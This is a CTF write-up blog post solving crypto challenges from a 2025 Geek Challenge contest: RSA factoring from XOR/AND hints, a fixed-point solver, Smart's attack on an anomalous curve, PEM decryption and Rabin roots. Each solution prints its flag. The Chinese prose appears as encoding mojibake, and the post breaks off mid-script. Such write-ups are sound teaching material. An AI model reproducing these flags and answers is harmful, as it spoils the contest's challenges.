</a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2025%E8%B5%9B/" rel="tag">2025èµ›</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" class="leancloud_visitors" data-flag-title="ç¬¬åå…­å±Šæå®¢å¤§æŒ‘æˆ˜"><span class="leancloud-visitors-count">âˆ</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/#comments" class="article-comment-link">è¯„è®º</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>â€‹</p><p>10.24 20:00 - 11.24 20:00 (UTC+8)</p><p>åˆ°åä¸¤å‘¨æ²¡æ€ä¹ˆåšäº†ã€‚</p><p><strong>Rank: 10</strong></p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h3><blockquote><p>å¬è¯´æœ‰ç®—æ³•é«˜æ‰‹,æˆ‘ç¨å¾®æ”¹äº†ä¸€ä¸‹ç­¾åˆ°é¢˜,å¿«æ¥è¯•è¯•å§,(flagå‰ç¼€æ˜¯syc)</p></blockquote><p>å·²çŸ¥ <code>N = p*q*s*r</code>ï¼Œå¹¶ç»™å‡º <code>n = p*q</code>ã€<code>gift = p ^ q</code>ã€<code>gift1 = s &amp; r</code>ã€<code>gift2 = s ^ r</code>ï¼Œä»¥åŠå¯†æ–‡ c å’Œå…¬é’¥ e = 65537ã€‚</p><p>ä» n ä¸ <code>gift = p ^ q</code> å¯ä»¥æ¢å¤å‡ºç´ æ•° p ä¸ qï¼ˆé€šè¿‡æŒ‰ä½é€ä½æ„é€ æ»¡è¶³æ¨¡ <code>2^k</code> æ¡ä»¶çš„æ–¹æ¡ˆï¼›å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä»ä½ä½å‘é«˜ä½é€ä½ç¡®å®šï¼Œå¿…è¦æ—¶å›æº¯ï¼‰ã€‚</p><p>å¯¹äº s å’Œ rï¼šæ³¨æ„æ’ç­‰å¼ <code>s + r = (s ^ r) + 2*(s &amp; r)</code>ï¼Œå› æ­¤ <code>S = gift2 + 2*gift1</code> å°±æ˜¯ <code>s + r</code>ã€‚åˆæœ‰ <code>P = s*r = N / n</code>ï¼Œäºæ˜¯ sã€r æ˜¯äºŒæ¬¡æ–¹ç¨‹ <code>x^2 - S x + P = 0</code> çš„æ ¹ï¼Œå¯ç”±åˆ¤åˆ«å¼å¼€æ–¹ç›´æ¥è·å¾—ã€‚</p><p>ç”¨å·²çŸ¥ giftï¼ˆå³ <code>p^q</code>ï¼‰å’Œ nï¼ŒæŒ‰ä½é‡å»ºå‡º pï¼ˆä»¤ <code>q = p ^ gift</code>ï¼Œå¹¶ç¡®ä¿ <code>p*q == n</code>ï¼‰ã€‚</p><p>è®¡ç®— <code>P = N // n</code>ï¼ˆå¾—åˆ° <code>s*r</code>ï¼‰ï¼Œè®¡ç®— <code>S = gift2 + 2*gift1</code>ï¼ˆå¾—åˆ° <code>s + r</code>ï¼‰ã€‚</p><p>è®¡ç®—åˆ¤åˆ«å¼ <code>D = S^2 - 4*P</code>ï¼Œå–æ•´æ•°å¹³æ–¹æ ¹ sqrt(D)ï¼Œå¾—åˆ° <code>s = (S + sqrt(D))//2</code>ï¼Œ<code>r = (S - sqrt(D))//2</code>ã€‚</p><p>æœ‰äº†å››ä¸ªç´ å› å­åï¼Œè®¡ç®—æ¬§æ‹‰å‡½æ•° <code>phi = (p-1)*(q-1)*(r-1)*(s-1)</code>ï¼Œæ±‚å‡ºç§é’¥ <code>d = e^&#123;-1&#125; mod phi</code>ï¼Œæœ€å <code>m = c^d mod N</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">12114282140129030221139165720039766369206816602912543911543781978648770300084428613171061953060266384429841484428732215252368009811130875276347534941874714457297474025227060487490713853301440917877280771734998220874195868270983517296552761924477514745040473578887509936945790259245154138347432294762694643113545451605193155323886625417458980089197202274810691448592725400564114850712497863770625334209249566232989992606497076063348029665644680946906322428277225178838518025623254240893146791821359089473224900379808514993113560101567320224162858217031176854613011276425771708406954417610317789259885040739954642374667</span></span><br><span class="line">n = <span class="number">91891351711379799931394178123406137903027189477005569059936904007248535049052097057222486024223574959494899324706948906013350601442586596023020519058250868888847562977333671773188012014902448961387215600156932673504112816058893268362611211565216592933077956777032650164332488098756557422740070442941348084921</span></span><br><span class="line">c = <span class="number">3231265723829112665640925095346482445691074656152495613367006320791218303024667683148786980985160622882017055128261102169256263170652774489339801477001275058585666508737704987192764426162573977263344192886400249198007892940084066468570229353879431384001463041292940472308358540532108957894938586227682908251475990882169979412586767210087025064295224506676379057986353004282550774815876093769770845018817117647615011444989401149674886486770646765454314760906436659162076044268401041579090930954919862146749470426101754009562077505810024012143379326028465156444246440949112724465484939452061684185387430755268355807999</span></span><br><span class="line">gift = <span class="number">5160856643507450510397828582001051679762426399445648048700295372044216322163410374903665868763924707209143638999442462398781974627158916257502760763419216</span></span><br><span class="line">gift1 = <span class="number">10475668758451987289276918780968515546700284023143612685496241510488708701498972819305540608876501965534227236009502810417525671358108167575178008316645429</span></span><br><span class="line">gift2 = <span class="number">2089035701361172996472331829521141923363322027241591404259262848963755908765054555529259508147866255819680957406084877552079796025933552021516283158425474</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- 1) æ¢å¤ p, q ----------</span></span><br><span class="line"><span class="comment"># æ€è·¯ï¼šé€ä½ï¼ˆä»ä½ä½åˆ°é«˜ä½ï¼‰æ„å»º p ä¸ q çš„äºŒè¿›åˆ¶è¡¨ç¤ºã€‚</span></span><br><span class="line"><span class="comment"># å‰ªæç­–ç•¥ï¼šè‹¥åœ¨ç¬¬ i ä½å·²å®šï¼Œåˆ™æ£€æŸ¥ (p_low * q_low) mod 2^(i+1) æ˜¯å¦ç­‰äº n mod 2^(i+1)ã€‚</span></span><br><span class="line"><span class="comment"># åªæœ‰æ»¡è¶³æ¨¡ç­‰å¼çš„åˆ†æ”¯æ‰ç»§ç»­æ‹“å±•ã€‚è¿™æ ·èƒ½æå¤§å‡å°‘åˆ†æ”¯æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line">n_mask_target = n  <span class="comment"># æˆ‘ä»¬ä¼šç”¨ n &amp; mask æ¯”è¾ƒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢„è®¡ç®— n çš„ä½ k ä½æŸ¥è¯¢æ‰€éœ€æ©ç çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mask</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bits = n.bit_length() + <span class="number">1</span>  <span class="comment"># +1 é˜²æ­¢æœ€é«˜ä½è¿›ä½é—®é¢˜</span></span><br><span class="line"></span><br><span class="line">sol_p = <span class="literal">None</span></span><br><span class="line">sol_q = <span class="literal">None</span></span><br><span class="line">visited = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨é€’å½’å›æº¯</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs_bit</span>(<span class="params">i, p_low, q_low</span>):</span><br><span class="line">    <span class="keyword">global</span> sol_p, sol_q, visited</span><br><span class="line">    <span class="keyword">if</span> sol_p <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span>  <span class="comment"># å·²æ‰¾åˆ°è§£ï¼ŒåŠæ—¶è¿”å›</span></span><br><span class="line">    <span class="keyword">if</span> i == bits:</span><br><span class="line">        <span class="comment"># æ£€æŸ¥å®Œæ•´ä¹˜ç§¯</span></span><br><span class="line">        <span class="keyword">if</span> p_low * q_low == n:</span><br><span class="line">            sol_p = p_low</span><br><span class="line">            sol_q = q_low</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    visited += <span class="number">1</span></span><br><span class="line">    xi = (gift &gt;&gt; i) &amp; <span class="number">1</span></span><br><span class="line">    <span class="comment"># ä¸¤ä¸ªå¯èƒ½çš„ p_i å€¼ (0 æˆ– 1)</span></span><br><span class="line">    <span class="keyword">for</span> pi <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        qi = pi ^ xi</span><br><span class="line">        new_p = p_low | (pi &lt;&lt; i)</span><br><span class="line">        new_q = q_low | (qi &lt;&lt; i)</span><br><span class="line">        <span class="comment"># å±€éƒ¨æ¨¡ 2^(i+1) æ£€æŸ¥ï¼š</span></span><br><span class="line">        k = i + <span class="number">1</span></span><br><span class="line">        mleft = (new_p * new_q) &amp; mask(k)</span><br><span class="line">        mright = n &amp; mask(k)</span><br><span class="line">        <span class="keyword">if</span> mleft != mright:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># å‰ªæ</span></span><br><span class="line">        <span class="comment"># åˆæ³•ï¼Œç»§ç»­ä¸‹ä¸€ä¸ªä½</span></span><br><span class="line">        dfs_bit(i + <span class="number">1</span>, new_p, new_q)</span><br><span class="line">        <span class="keyword">if</span> sol_p <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨ DFS</span></span><br><span class="line">dfs_bit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p = sol_p</span><br><span class="line">q = sol_q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æ¢å¤å®Œæˆï¼š&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p bit-length:&quot;</span>, p.bit_length())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q bit-length:&quot;</span>, q.bit_length())</span><br><span class="line"><span class="comment"># éªŒè¯</span></span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"><span class="keyword">assert</span> (p ^ q) == gift</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- 2) æ¢å¤ s, r ----------</span></span><br><span class="line"><span class="comment"># å·²çŸ¥:</span></span><br><span class="line"><span class="comment">#   gift1 = s &amp; r</span></span><br><span class="line"><span class="comment">#   gift2 = s ^ r</span></span><br><span class="line"><span class="comment"># å› ä¸º s + r = (s^r) + 2*(s&amp;r)</span></span><br><span class="line">S = gift2 + <span class="number">2</span> * gift1</span><br><span class="line">P = N // n  <span class="comment"># s * r</span></span><br><span class="line"><span class="comment"># è§£æ–¹ç¨‹ x^2 - S*x + P = 0</span></span><br><span class="line">D = S * S - <span class="number">4</span> * P</span><br><span class="line">sqrtD = isqrt(D)</span><br><span class="line"><span class="keyword">if</span> sqrtD * sqrtD != D:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;åˆ¤åˆ«å¼ä¸æ˜¯å®Œå…¨å¹³æ–¹ï¼Œæ¢å¤ s,r å¤±è´¥ã€‚&quot;</span>)</span><br><span class="line">s = (S + sqrtD) // <span class="number">2</span></span><br><span class="line">r = (S - sqrtD) // <span class="number">2</span></span><br><span class="line"><span class="comment"># éªŒè¯</span></span><br><span class="line"><span class="keyword">assert</span> s * r == P</span><br><span class="line"><span class="keyword">assert</span> (s ^ r) == gift2</span><br><span class="line"><span class="keyword">assert</span> (s &amp; r) == gift1</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s, r æ¢å¤æˆåŠŸã€‚&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- 3) è®¡ç®—ç§é’¥å¹¶è§£å¯† ----------</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>) * (s - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;syc&#123;we1c0me_t190_ge1k_your_code_is_v1ey_de1psrc!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Caesar-Slot-Machine"><a href="#Caesar-Slot-Machine" class="headerlink" title="Caesar Slot Machine"></a>Caesar Slot Machine</h3><blockquote><p>Have fun ^v^</p></blockquote><p>æ‰¾æ»¡è¶³ $x \equiv (ax+b) \pmod p$ çš„ä¸åŠ¨ç‚¹ï¼Œè®¡ç®— $x = b \cdot (1-a)^{-1} \bmod p$ å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>, <span class="number">31477</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    a = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    b = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    p = <span class="built_in">eval</span>(r.recvline())</span><br><span class="line">    <span class="built_in">print</span>((a, b, p))</span><br><span class="line">    x = b * inverse(<span class="number">1</span>-a, p) % p</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(x).encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag: SYC&#123;you_found_the_fixed_point&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ez-ecc"><a href="#ez-ecc" class="headerlink" title="ez_ecc"></a>ez_ecc</h3><blockquote><p>orderä¸æ˜¯é¡ºåº</p></blockquote><p>æ¤­åœ†æ›²çº¿æ»¡è¶³ï¼šE.order() = pï¼Œä½¿ç”¨Smart Attackæ±‚DLPã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfba8cae6451eb4c413b60b892ee2d517dfdb17a52451776a68efa34485619411</span></span><br><span class="line">A = <span class="number">0x1ef1e93d0f9acda1b7c0172f27d28f3a7d0f2d9343513a3aac191e12f6e51123</span></span><br><span class="line">B = <span class="number">0xcad65954bbe0fb8f2f9c22b5cae1aa42306fd58e8394652818e781e5f808e17a</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [A, B])</span><br><span class="line"></span><br><span class="line">P_x = <span class="number">0x708c0cf66f132122f3fcd1f75c6f22d4a90d34650dd81fb3a57b75dad98d35e7</span></span><br><span class="line">P_y = <span class="number">0xcfb017daf37cbba3c6a5c6e7c4327692595c16b47e4bfa1ad400bffe5b500fba</span></span><br><span class="line">P = E(P_x, P_y)</span><br><span class="line"></span><br><span class="line">Q_x = <span class="number">97490713033364940809544067604441149095210096571946998449251275861394744757515</span></span><br><span class="line">Q_y = <span class="number">32198694245056943922016695558131047889851279706531342583322750112905104448879</span></span><br><span class="line">Q = E(Q_x, Q_y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(E.order())</span><br><span class="line"><span class="built_in">print</span>(E.order() == p)</span><br><span class="line"></span><br><span class="line">k = SmartAttack(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(k))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;@n()ma1ou$_cu2ves_r!sky&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="pem"><a href="#pem" class="headerlink" title="pem"></a>pem</h3><blockquote><p>åæ­£ç§é’¥åœ¨æˆ‘æ‰‹é‡Œï¼Œåˆ«äººæ‹¿åˆ° enc ä¹Ÿæ²¡ç”¨ï¼</p></blockquote><p>ç»™äº†ç§é’¥å’Œå¯†æ–‡ï¼Œè·å–è§£å¯†å‚æ•°ï¼ŒRSAæ±‚è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">key_data = <span class="built_in">open</span>(<span class="string">&#x27;pem/key.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">c = bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;pem/enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">rsa = RSA.import_key(key_data, passphrase=<span class="literal">None</span>)</span><br><span class="line">d = rsa.d</span><br><span class="line">p = rsa.p</span><br><span class="line">q = rsa.q</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;PEM_1s_n0t_only_S5l&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="baby-rabin"><a href="#baby-rabin" class="headerlink" title="baby_rabin"></a>baby_rabin</h3><blockquote><p>ç‚’é¸¡ç­¾åˆ°é¢˜,ç‚¹å‡»å°±é€.flagå‰ç¼€æ˜¯syc</p></blockquote><p>eä¸r-1ä¸äº’ç´ ï¼Œç”¨nth_rootæ±‚è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">C = <span class="number">451731346880007131332999430306985234187530419447859396067624968918101700861978676040615622417464916959678829732066195225132545956101693588984833424213755513877236702139360270137668415610295492436471366218119012903840729628449361663941761372974624789549775182866112541811446267811259781269568865266459437049508062916974638523947634702667929562107001830919422408810565410106056693018550877651160930860996772712877149329227066558481842344525735406568814917991752005</span></span><br><span class="line">n = <span class="number">491917847075013900815069309520768928274976990404751846981543204333198666419468384809286945880906855848713238459489821614928060098982194326560178675579884014989600009897895019721278191710357177079087876324831068589971763176646200619528739550876421709762258644696629617862167991346900122049024287039400659899610706153110527311944790794239992462632602379626260229348762760395449238458507745619804388510205772573967935937419407673995019892908904432789586779953769907</span></span><br><span class="line">hint = <span class="number">66035251530240295423188999524554429498804416520951289016547753908652377333150838269168825344004730830028024338415783274479674378412532765763584271087554367024433779628323692638506285635583547190049386810983085033061336995321777237180762044362497604095831885258146390576684671783882528186837336673907983527353</span></span><br><span class="line">e = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">r = n // hint</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> GF(r)(C).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">        res = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="keyword">if</span> res.isascii():</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;syc&#123;th1s_so_1z_mum_never_ca1r_mytstu1d&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="xor-revenge"><a href="#xor-revenge" class="headerlink" title="xor_revenge"></a>xor_revenge</h3><blockquote><p>èˆ¹æ–°å‚æœ¬,æ¬¢è¿æ¥ç©.</p></blockquote><p>ç¬¬ä¸€éƒ¨åˆ†å·²çŸ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n=p*q</span><br><span class="line">gift1=p^q</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ab</span>(<span class="params">n, x</span>):</span><br><span class="line">    a = [<span class="number">0</span>]</span><br><span class="line">    b = [<span class="number">0</span>]</span><br><span class="line">    maskx = <span class="number">1</span></span><br><span class="line">    maskn = <span class="number">2</span>    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">        xbit = (x &amp; maskx) &gt;&gt; i</span><br><span class="line">        nbit = n % maskn</span><br><span class="line">        taa = []</span><br><span class="line">        tbb = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">            <span class="keyword">for</span> aa <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> bb <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">if</span> aa ^ bb == xbit:</span><br><span class="line">                        temp2 = n % maskn</span><br><span class="line">                        temp1 = (aa * maskn // <span class="number">2</span> + a[j]) * (bb * maskn // <span class="number">2</span>+ b[j]) % maskn</span><br><span class="line">                        <span class="keyword">if</span> temp1 == temp2:</span><br><span class="line">                            